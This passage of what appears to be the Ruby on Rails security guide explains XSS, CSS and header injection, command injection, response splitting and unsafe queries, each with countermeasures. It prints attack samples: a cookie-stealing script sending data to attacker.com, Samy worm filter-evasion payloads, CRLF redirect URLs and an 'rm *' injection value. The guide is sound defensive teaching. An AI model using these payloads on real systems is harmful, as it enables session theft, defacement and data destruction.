<p>The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. <em>Escaping user input is essential</em>.</p>

<p>Here is the most straightforward test to check for XSS:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">Hello</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"javascript:alert('Hello')"</span><span class="nt">&gt;</span>
<span class="nt">&lt;table</span> <span class="na">background=</span><span class="s">"javascript:alert('Hello')"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<h5 id="cookie-theft">Cookie Theft</h5>

<p>These examples don’t do any harm so far, so let’s see how an attacker can steal the user’s cookie (and thus hijack the user’s session). In JavaScript you can use the <code class="language-plaintext highlighter-rouge">document.cookie</code> property to read and write the document’s cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The <code class="language-plaintext highlighter-rouge">document.cookie</code> property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>For an attacker, of course, this is not useful, as the victim will see their own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review their web server’s access log files to see the victim’s cookie.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;img src="http://www.attacker.com/</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"&gt;</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>The log files on www.attacker.com will read like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
</code></pre></div></div>

<p>You can mitigate these attacks (in the obvious way) by adding the <strong>httpOnly</strong> flag to cookies, so that <code class="language-plaintext highlighter-rouge">document.cookie</code> may not be read by JavaScript. HTTP only cookies can be used from IE v6.SP1, Firefox v2.0.0.5, Opera 9.5, Safari 4, and Chrome 1.0.154 onwards. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies <a href="https://owasp.org/www-community/HttpOnly#browsers-supporting-httponly">will still be visible using Ajax</a>, though.</p>

<h5 id="defacement">Defacement</h5>

<p>With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attacker’s website to steal the cookie, login credentials, or other sensitive data. The most popular way is to include code from external sources by iframes:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">name=</span><span class="s">"StatPage"</span> <span class="na">src=</span><span class="s">"http://58.xx.xxx.xxx"</span> <span class="na">width=</span><span class="s">5</span> <span class="na">height=</span><span class="s">5</span> <span class="na">style=</span><span class="s">"display:none"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</code></pre></div></div>

<p>This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This <code class="language-plaintext highlighter-rouge">iframe</code> is taken from an actual attack on legitimate Italian sites using the <a href="https://isc.sans.edu/diary/MPack+Analysis/3015">Mpack attack framework</a>. Mpack tries to install malicious software through security holes in the web browser - very successfully, 50% of the attacks succeed.</p>

<p>A more specialized attack could overlap the entire website or display a login form, which looks the same as the site’s original, but transmits the username and password to the attacker’s site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake website.</p>

<p>Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that “George Bush appointed a 9 year old boy to be the chairperson…”:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1--&gt;
  &lt;script src=http://www.securitylab.ru/test/sc.js&gt;&lt;/script&gt;&lt;!--
</code></pre></div></div>

<h5 id="countermeasures-1">Countermeasures</h5>

<p><em>It is very important to filter malicious input, but it is also important to escape the output of the web application</em>.</p>

<p>Especially for XSS, it is important to do <em>permitted input filtering instead of restricted</em>. Permitted list filtering states the values allowed as opposed to the values not allowed. Restricted lists are never complete.</p>

<p>Imagine a restricted list deletes <code class="language-plaintext highlighter-rouge">"script"</code> from the user input. Now the attacker injects <code class="language-plaintext highlighter-rouge">"&lt;scrscriptipt&gt;"</code>, and after the filter, <code class="language-plaintext highlighter-rouge">"&lt;script&gt;"</code> remains. Earlier versions of Rails used a restricted list approach for the <code class="language-plaintext highlighter-rouge">strip_tags()</code>, <code class="language-plaintext highlighter-rouge">strip_links()</code> and <code class="language-plaintext highlighter-rouge">sanitize()</code> method. So this kind of injection was possible:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">strip_tags</span><span class="p">(</span><span class="s2">"some&lt;&lt;b&gt;script&gt;alert('hello')&lt;&lt;/b&gt;/script&gt;"</span><span class="p">)</span>
</code></pre></div></div>

<p>This returned <code class="language-plaintext highlighter-rouge">"some&lt;script&gt;alert('hello')&lt;/script&gt;"</code>, which makes an attack work. That’s why a permitted list approach is better, using the updated Rails 2 method <code class="language-plaintext highlighter-rouge">sanitize()</code>:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tags</span> <span class="o">=</span> <span class="sx">%w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">sanitize</span><span class="p">(</span><span class="n">user_input</span><span class="p">,</span> <span class="ss">tags: </span><span class="n">tags</span><span class="p">,</span> <span class="ss">attributes: </span><span class="sx">%w(href title)</span><span class="p">)</span>
</code></pre></div></div>

<p>This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.</p>

<p>Both Action View and Action Text build their <a href="https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html">sanitization helpers</a> on top of the <a href="https://github.com/rails/rails-html-sanitizer">rails-html-sanitizer</a> gem.</p>

<p>As a second step, <em>it is good practice to escape all output of the application</em>, especially when re-displaying user input, which hasn’t been input-filtered (as in the search form example earlier on). <em>Use <code class="language-plaintext highlighter-rouge">html_escape()</code> (or its alias <code class="language-plaintext highlighter-rouge">h()</code>) method</em> to replace the HTML input characters <code class="language-plaintext highlighter-rouge">&amp;</code>, <code class="language-plaintext highlighter-rouge">"</code>, <code class="language-plaintext highlighter-rouge">&lt;</code>, and <code class="language-plaintext highlighter-rouge">&gt;</code> by their uninterpreted representations in HTML (<code class="language-plaintext highlighter-rouge">&amp;amp;</code>, <code class="language-plaintext highlighter-rouge">&amp;quot;</code>, <code class="language-plaintext highlighter-rouge">&amp;lt;</code>, and <code class="language-plaintext highlighter-rouge">&amp;gt;</code>).</p>

<h5 id="obfuscation-and-encoding-injection">Obfuscation and Encoding Injection</h5>

<p>Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;</span>
  <span class="err">&amp;</span><span class="na">#108</span><span class="err">;&amp;</span><span class="na">#101</span><span class="err">;&amp;</span><span class="na">#114</span><span class="err">;&amp;</span><span class="na">#116</span><span class="err">;&amp;</span><span class="na">#40</span><span class="err">;&amp;</span><span class="na">#39</span><span class="err">;&amp;</span><span class="na">#88</span><span class="err">;&amp;</span><span class="na">#83</span><span class="err">;&amp;</span><span class="na">#83</span><span class="err">;&amp;</span><span class="na">#39</span><span class="err">;&amp;</span><span class="na">#41</span><span class="err">;</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>This example pops up a message box. It will be recognized by the above <code class="language-plaintext highlighter-rouge">sanitize()</code> filter, though. A great tool to obfuscate and encode strings, and thus “get to know your enemy”, is the <a href="https://hackvertor.co.uk/public">Hackvertor</a>. Rails’ <code class="language-plaintext highlighter-rouge">sanitize()</code> method does a good job to fend off encoding attacks.</p>

<h4 id="examples-from-the-underground">Examples from the Underground</h4>

<p><em>In order to understand today’s attacks on web applications, it’s best to take a look at some real-world attack vectors.</em></p>

<p>The following is an excerpt from the <a href="https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=12d8d106-1137-4d7c-8bb4-3ea1faec83fa">Js.Yamanner@m Yahoo! Mail worm</a>. It appeared on June 11, 2006 and was the first webmail interface worm:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">'http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'</span>
  <span class="na">target=</span><span class="s">""</span><span class="na">onload=</span><span class="s">"var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
</span></code></pre></div></div>

<p>The worms exploit a hole in Yahoo’s HTML/JavaScript filter, which usually filters all targets and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why restricted list filters are never complete and why it is hard to allow HTML/JavaScript in a web application.</p>

<p>Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on <a href="http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/">Rosario Valotta’s paper</a>. Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.</p>

<p>In December 2006, 34,000 actual usernames and passwords were stolen in a <a href="https://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html">MySpace phishing attack</a>. The idea of the attack was to create a profile page named “login_home_index_html”, so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.</p>

<h3 id="css-injection">CSS Injection</h3>

<p>INFO: <em>CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari, and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application.</em></p>

<p>CSS Injection is explained best by the well-known <a href="https://samy.pl/myspace/tech.html">MySpace Samy worm</a>. This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, which created so much traffic that MySpace went offline. The following is a technical explanation of that worm.</p>

<p>MySpace blocked many tags, but allowed CSS. So the worm’s author put JavaScript into CSS like this:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"background:url('javascript:alert(1)')"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript has a handy <code class="language-plaintext highlighter-rouge">eval()</code> function which executes any string as code.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"mycode"</span> <span class="na">expr=</span><span class="s">"alert('hah!')"</span> <span class="na">style=</span><span class="s">"background:url('javascript:eval(document.all.mycode.expr)')"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">eval()</code> function is a nightmare for restricted list input filters, as it allows the style attribute to hide the word “innerHTML”:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">alert</span><span class="p">(</span><span class="nf">eval</span><span class="p">(</span><span class="dl">'</span><span class="s1">document.body.inne</span><span class="dl">'</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">rHTML</span><span class="dl">'</span><span class="p">));</span>
</code></pre></div></div>

<p>The next problem was MySpace filtering the word <code class="language-plaintext highlighter-rouge">"javascript"</code>, so the author used <code class="language-plaintext highlighter-rouge">"java&lt;NEWLINE&gt;script"</code> to get around this:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"mycode"</span> <span class="na">expr=</span><span class="s">"alert('hah!')"</span> <span class="na">style=</span><span class="s">"background:url('java↵script:eval(document.all.mycode.expr)')"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>Another problem for the worm’s author was the <a href="#cross-site-request-forgery-csrf">CSRF security tokens</a>. Without them he couldn’t send a friend request over POST. He got around it by sending a GET to the page right before adding a user and parsing the result for the CSRF token.</p>

<p>In the end, he got a 4 KB worm, which he injected into his profile page.</p>

<p>The <a href="https://securiteam.com/securitynews/5LP051FHPE">moz-binding</a> CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).</p>

<h4 id="countermeasures-2">Countermeasures</h4>

<p>This example, again, showed that a restricted list filter is never complete. However, as custom CSS in web applications is a quite rare feature, it may be hard to find a good permitted CSS filter. <em>If you want to allow custom colors or images, you can allow the user to choose them and build the CSS in the web application</em>. Use Rails’ <code class="language-plaintext highlighter-rouge">sanitize()</code> method as a model for a permitted CSS filter, if you really need one.</p>

<h3 id="textile-injection">Textile Injection</h3>

<p>If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. <a href="https://github.com/jgarber/redcloth">RedCloth</a> is such a language for Ruby, but without precautions, it is also vulnerable to XSS.</p>

<p>For example, RedCloth translates <code class="language-plaintext highlighter-rouge">_test_</code> to <code class="language-plaintext highlighter-rouge">&lt;em&gt;test&lt;em&gt;</code>, which makes the
text italic. However, RedCloth doesn’t filter unsafe html tags by default:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">RedCloth</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"&lt;script&gt;alert(1)&lt;/script&gt;"</span><span class="p">).</span><span class="nf">to_html</span>
<span class="c1"># =&gt; "&lt;script&gt;alert(1)&lt;/script&gt;"</span>
</code></pre></div></div>

<p>Use the <code class="language-plaintext highlighter-rouge">:filter_html</code> option to remove HTML which was not created by the Textile processor.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">RedCloth</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"&lt;script&gt;alert(1)&lt;/script&gt;"</span><span class="p">,</span> <span class="p">[</span><span class="ss">:filter_html</span><span class="p">]).</span><span class="nf">to_html</span>
<span class="c1"># =&gt; "alert(1)"</span>
</code></pre></div></div>

<p>However, this does not filter all HTML, a few tags will be left (by design), for example <code class="language-plaintext highlighter-rouge">&lt;a&gt;</code>:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">RedCloth</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"&lt;a href='javascript:alert(1)'&gt;hello&lt;/a&gt;"</span><span class="p">,</span> <span class="p">[</span><span class="ss">:filter_html</span><span class="p">]).</span><span class="nf">to_html</span>
<span class="c1"># =&gt; "&lt;p&gt;&lt;a href="javascript:alert(1)"&gt;hello&lt;/a&gt;&lt;/p&gt;"</span>
</code></pre></div></div>

<h4 id="countermeasures-3">Countermeasures</h4>

<p>It is recommended to <em>use RedCloth in combination with a permitted input filter</em>, as described in the countermeasures against XSS section.</p>

<h3 id="ajax-injection">Ajax Injection</h3>

<p>NOTE: <em>The same security precautions have to be taken for Ajax actions as for “normal” ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn’t render a view.</em></p>

<p>If you use the <a href="https://rubygems.org/gems/in_place_editing">in_place_editor plugin</a>, or actions that return a string, rather than rendering a view, <em>you have to escape the return value in the action</em>. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the <code class="language-plaintext highlighter-rouge">h()</code> method.</p>

<h3 id="command-line-injection">Command Line Injection</h3>

<p>NOTE: <em>Use user-supplied command line parameters with caution.</em></p>

<p>If your application has to execute commands in the underlying operating system, there are several methods in Ruby: <code class="language-plaintext highlighter-rouge">system(command)</code>, <code class="language-plaintext highlighter-rouge">exec(command)</code>, <code class="language-plaintext highlighter-rouge">spawn(command)</code> and <code class="language-plaintext highlighter-rouge">`command`</code>. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (<code class="language-plaintext highlighter-rouge">;</code>) or a vertical bar (<code class="language-plaintext highlighter-rouge">|</code>).</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">user_input</span> <span class="o">=</span> <span class="s2">"hello; rm *"</span>
<span class="nb">system</span><span class="p">(</span><span class="s2">"/bin/echo </span><span class="si">#{</span><span class="n">user_input</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="c1"># prints "hello", and deletes files in the current directory</span>
</code></pre></div></div>

<p>A countermeasure is to <em>use the <code class="language-plaintext highlighter-rouge">system(command, parameters)</code> method which passes command line parameters safely</em>.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">system</span><span class="p">(</span><span class="s2">"/bin/echo"</span><span class="p">,</span> <span class="s2">"hello; rm *"</span><span class="p">)</span>
<span class="c1"># prints "hello; rm *" and does not delete files</span>
</code></pre></div></div>

<h4 id="kernelopens-vulnerability">Kernel#open’s Vulnerability</h4>

<p><code class="language-plaintext highlighter-rouge">Kernel#open</code> executes OS command if the argument starts with a vertical bar (<code class="language-plaintext highlighter-rouge">|</code>).</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">open</span><span class="p">(</span><span class="s2">"| ls"</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">file</span><span class="o">|</span> <span class="n">file</span><span class="p">.</span><span class="nf">read</span> <span class="p">}</span>
<span class="c1"># returns file list as a String via `ls` command</span>
</code></pre></div></div>

<p>Countermeasures are to use <code class="language-plaintext highlighter-rouge">File.open</code>, <code class="language-plaintext highlighter-rouge">IO.open</code> or <code class="language-plaintext highlighter-rouge">URI#open</code> instead. They don’t execute an OS command.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">"| ls"</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">file</span><span class="o">|</span> <span class="n">file</span><span class="p">.</span><span class="nf">read</span> <span class="p">}</span>

<span class="c1"># opens the URI. `URI()` doesn't accept `| ls`</span>
</code></pre></div></div>

<h3 id="header-injection">Header Injection</h3>

<p>WARNING: <em>HTTP headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, XSS, or HTTP response splitting.</em></p>

<p>HTTP request headers have a Referer, User-Agent (client software), and Cookie field, among others. Response headers for example have a status code, Cookie, and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. <em>Remember to escape these header fields, too.</em> For example when you display the user agent in an administration area.</p>

<p>Besides that, it is <em>important to know what you are doing when building response headers partly based on user input.</em> For example you want to redirect the user back to a specific page. To do that you introduced a “referer” field in a form to redirect to the given address:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">redirect_to</span> <span class="n">params</span><span class="p">[</span><span class="ss">:referer</span><span class="p">]</span>
</code></pre></div></div>

<p>What happens is that Rails puts the string into the <code class="language-plaintext highlighter-rouge">Location</code> header field and sends a 302 (redirect) status to the browser. The first thing a malicious user would do, is this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
</code></pre></div></div>

<p>And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
</code></pre></div></div>

<p>Note that <code class="language-plaintext highlighter-rouge">%0d%0a</code> is URL-encoded for <code class="language-plaintext highlighter-rouge">\r\n</code> which is a carriage-return and line-feed (CRLF) in Ruby. So the resulting HTTP header for the second example will be the following because the second Location header field overwrites the first.</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Moved Temporarily</span>
<span class="s">(...)</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">http://www.malicious.tld</span>
</code></pre></div></div>

<p>So <em>attack vectors for Header Injection are based on the injection of CRLF characters in a header field.</em> And what could an attacker do with a false redirection? They could redirect to a phishing site that looks the same as yours, but ask to login again (and sends the login credentials to the attacker). Or they could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the <code class="language-plaintext highlighter-rouge">redirect_to</code> method. <em>Make sure you do it yourself when you build other header fields with user input.</em></p>

<h4 id="dns-rebinding-and-host-header-attacks">DNS Rebinding and Host Header Attacks</h4>

<p>DNS rebinding is a method of manipulating resolution of domain names that is commonly used as a form of computer attack. DNS rebinding circumvents the same-origin policy by abusing the Domain Name System (DNS) instead. It rebinds a domain to a different IP address and then compromises the system by executing random code against your Rails app from the changed IP address.</p>

<p>It is recommended to use the <code class="language-plaintext highlighter-rouge">ActionDispatch::HostAuthorization</code> middleware to guard against DNS rebinding and other Host header attacks. It is enabled by default in the development environment, you have to activate it in production and other environments by setting the list of allowed hosts. You can also configure exceptions and set your own response app.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">hosts</span> <span class="o">&lt;&lt;</span> <span class="s2">"product.com"</span>

<h4 id="response-splitting">Response Splitting</h4>

<p>If Header Injection was possible, Response Splitting might be, too. In HTTP, the header block is followed by two CRLFs and the actual data (usually HTML). The idea of Response Splitting is to inject two CRLFs into a header field, followed by another response with malicious HTML. The response will be:</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found [First standard 302 response]</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 12 Apr 2005 22:09:07 GMT</span>
<span class="na">Location</span><span class="p">:</span><span class="s">Content-Type: text/html</span>


HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html


&amp;lt;html&amp;gt;&amp;lt;font color=red&amp;gt;hey&amp;lt;/font&amp;gt;&amp;lt;/html&amp;gt; [Arbitrary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
</code></pre></div></div>

<p>Under certain circumstances this would present the malicious HTML to the victim. However, this only seems to work with Keep-Alive connections (and many browsers are using one-time connections). But you can’t rely on this. <em>In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks.</em></p>

<h2 id="unsafe-query-generation">Unsafe Query Generation</h2>

<p>Due to the way Active Record interprets parameters in combination with the way
that Rack parses query parameters it was possible to issue unexpected database
queries with <code class="language-plaintext highlighter-rouge">IS NULL</code> where clauses. As a response to that security issue
(<a href="https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ">CVE-2012-2660</a>,
<a href="https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ">CVE-2012-2694</a>
and <a href="https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ">CVE-2013-0155</a>)
<code class="language-plaintext highlighter-rouge">deep_munge</code> method was introduced as a solution to keep Rails secure by default.</p>

<p>Example of vulnerable code that could be used by attacker, if <code class="language-plaintext highlighter-rouge">deep_munge</code>
wasn’t performed is:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">unless</span> <span class="n">params</span><span class="p">[</span><span class="ss">:token</span><span class="p">].</span><span class="nf">nil?</span>
  <span class="n">user</span> <span class="o">=</span> <span class="no">User</span><span class="p">.</span><span class="nf">find_by_token</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="ss">:token</span><span class="p">])</span>
  <span class="n">user</span><span class="p">.</span><span class="nf">reset_password!</span>
<span class="k">end</span>
</code></pre></div></div>

<p>When <code class="language-plaintext highlighter-rouge">params[:token]</code> is one of: <code class="language-plaintext highlighter-rouge">[nil]</code>, <code class="language-plaintext highlighter-rouge">[nil, nil, ...]</code> or
<code class="language-plaintext highlighter-rouge">['foo', nil]</code> it will bypass the test for <code class="language-plaintext highlighter-rouge">nil</code>, but <code class="language-plaintext highlighter-rouge">IS NULL</code> or
<code class="language-plaintext highlighter-rouge">IN ('foo', NULL)</code> where clauses still will be added to the SQL query.</p>

<p>To keep Rails secure by default, <code class="language-plaintext highlighter-rouge">deep_munge</code> replaces some of the values with
<code class="language-plaintext highlighter-rouge">nil</code>. Below table shows what the parameters look like based on <code class="language-plaintext highlighter-rouge">JSON</code> sent in
request:</p>

<table>
  <thead>
    <tr>
      <th>JSON</th>
      <th>Parameters</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">{ "person": null }</code></td>
      <td><code class="language-plaintext highlighter-rouge">{ :person =&gt; nil }</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">{ "person": [] }</code></td>
      <td><code class="language-plaintext highlighter-rouge">{ :person =&gt; [] }</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">{ "person": [null] }</code></td>
      <td><code class="language-plaintext highlighter-rouge">{ :person =&gt; [] }</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">{ "person": [null, null, ...] }</code></td>
      <td><code class="language-plaintext highlighter-rouge">{ :person =&gt; [] }</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">{ "person": ["foo", null] }</code></td>
      <td><code class="language-plaintext highlighter-rouge">{ :person =&gt; ["foo"] }</code></td>
    </tr>
  </tbody>
</table>

<p>It is possible to return to old behavior and disable <code class="language-plaintext highlighter-rouge">deep_munge</code> configuring
your application if you are aware of the risk and know how to handle it:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">perform_deep_munge</span> <span class="o">=</span> <span class="kp">false</span>

<h2 id="http-security-headers">HTTP Security Headers</h2>

<p>To improve the security of your application, Rails can be configured to return
HTTP security headers. Some headers are configured by default; others need to
be explicitly configured.</p>

<h3 id="default-security-headers">Default Security Headers</h3>

<p>By default Rails is configured to return the following response headers. Your
application returns these headers for every HTTP response.</p>

<h4 id="x-frame-options"><code class="language-plaintext highlighter-rouge">X-Frame-Options</code></h4>

<p>The <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options"><code class="language-plaintext highlighter-rouge">X-Frame-Options</code></a> header indicates if a browser can render the page in a <code class="language-plaintext highlighter-rouge">&lt;frame&gt;</code>,
<code class="language-plaintext highlighter-rouge">&lt;iframe&gt;</code>, <code class="language-plaintext highlighter-rouge">&lt;embed&gt;</code> or <code class="language-plaintext highlighter-rouge">&lt;object&gt;</code> tag. This header is set to <code class="language-plaintext highlighter-rouge">SAMEORIGIN</code> by
default to allow framing on the same domain only. Set it to <code class="language-plaintext highlighter-rouge">DENY</code> to deny
framing at all, or remove this header completely if you want to allow framing on
all domains.</p>

<h4 id="x-xss-protection"><code class="language-plaintext highlighter-rouge">X-XSS-Protection</code></h4>

<p>A <a href="https://owasp.org/www-project-secure-headers/#x-xss-protection">deprecated legacy
header</a>, set to
<code class="language-plaintext highlighter-rouge">0</code> in Rails by default to disable problematic legacy XSS auditors.</p>

<h4 id="x-content-type-options"><code class="language-plaintext highlighter-rouge">X-Content-Type-Options</code></h4>

<p>The <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options"><code class="language-plaintext highlighter-rouge">X-Content-Type-Options</code></a> header is set to <code class="language-plaintext highlighter-rouge">nosniff</code> in Rails by default.
It stops the browser from guessing the MIME type of a file.</p>

<h4 id="x-permitted-cross-domain-policies"><code class="language-plaintext highlighter-rouge">X-Permitted-Cross-Domain-Policies</code></h4>

